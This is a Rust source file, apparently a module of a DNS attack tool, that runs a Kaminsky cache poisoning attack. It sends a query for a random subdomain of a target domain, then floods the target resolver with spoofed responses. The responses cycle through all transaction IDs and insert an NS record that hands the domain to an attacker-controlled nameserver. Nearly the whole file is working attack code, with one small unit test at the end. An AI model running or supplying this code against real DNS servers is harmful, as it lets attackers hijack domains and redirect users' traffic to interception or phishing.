use crate::dns;
use crate::spoofer::Spoofer;
use rand;
use rand::seq::SliceRandom;
use std::net::Ipv4Addr;
use std::time::{Duration, Instant};

fn rand_alphanum_string(length: usize) -> String {
    let mut rng = rand::thread_rng();
    let alphanum: Vec<char> = ('a'..='z').chain('A'..='Z').chain('0'..='9').collect();
    return (0..length)
        .map(|_| alphanum.choose(&mut rng).unwrap())
        .collect();
}

/// Runs a Kaminsky DNS cache poisoning attack against the target server for the target domain
///
/// The duration argument specifies roughly how long the attack should run for
pub fn attack(
    attacker_ns: &str,
    target_domain: &str,
    target_server_addr: &Ipv4Addr,
    spoofed_addrs: &[Ipv4Addr],
    duration: Duration,
    delay: Duration,
) -> Result<(), String> {
    const RAND_RESOURCE_LEN: usize = 7;
    const TTL: u32 = 240;

    let client = dns::Client::new(target_server_addr.to_string());

    let rand_fqdn = format!(
        "{}.{}",
        rand_alphanum_string(RAND_RESOURCE_LEN),
        target_domain
    );

    println!(
        "Will launch an attack by sending a request for {}",
        rand_fqdn
    );

    let request = dns::Query::new(vec![rand_fqdn.clone()]);
    let request_message = request.to_message()?;

    let mut response = dns::Response::new(request_message.clone());
    response
        .add_answer(dns::Record::A(dns::ARecord {
            name: rand_fqdn,
            ttl: 0, // we do not cache to avoid caching the random record
            ip: [127, 0, 0, 1],
        }))
        .unwrap();
    response
        .add_authority(dns::Record::NS(dns::NSRecord {
            name: String::from(target_domain),
            ttl: TTL,
            ns: String::from(attacker_ns),
        }))
        .unwrap();

    let response_message = response.to_message()?;

    let start = Instant::now();

    // Send query and then immediately commence the attack
    client.send_message_no_recv(&request_message)?;

    while start.elapsed() < duration {
        for addr in spoofed_addrs {
            let mut spoofer =
                match Spoofer::new(addr, target_server_addr, response_message.to_bytes().len()) {
                    Err(e) => return Err(e.to_string()),
                    Ok(s) => s,
                };

            // Wait to allow the outgoing dns request to be sent
            std::thread::sleep(delay);

            spam_message(
                &response_message,
                0..u16::max_value(),
                &mut spoofer,
                duration.checked_sub(start.elapsed()).unwrap_or(duration),
            )?;
        }
    }

    return Ok(());
}

fn spam_message<T: Iterator<Item = u16>>(
    message: &dns::message::Message,
    ids: T,
    spoofer: &mut Spoofer,
    duration: Duration,
) -> Result<(), String> {
    let mut bytes = message.to_bytes();
    const ID_OFFSET: usize = 0;

    let start = Instant::now();
    for id in ids {
        let new_bytes = id.to_be_bytes();
        bytes[ID_OFFSET] = new_bytes[0];
        bytes[ID_OFFSET + 1] = new_bytes[1];

        match spoofer.send_bytes(&bytes) {
            Err(e) => return Err(e.to_string()),
            _ => (),
        };

        if start.elapsed() > duration {
            eprintln!(
                "Stopping early after {} seconds and {} iterations",
                start.elapsed().as_secs_f32(),
                id + 1
            );
            break;
        }
    }
    return Ok(());
}

#[cfg(test)]
mod tests {
    use crate::kaminsky::rand_alphanum_string;
    use std::collections::HashSet;

    #[test]
    fn test_random_string_reuses_chars() {
        // number of alphanumeric characters
        const NUM_CHARS: usize = 62;
        let string = rand_alphanum_string(NUM_CHARS + 1);
        let unique_chars: HashSet<char> = string.chars().collect();

        assert_eq!(NUM_CHARS + 1, string.chars().count());
        assert!(unique_chars.len() < string.chars().count());
    }
}
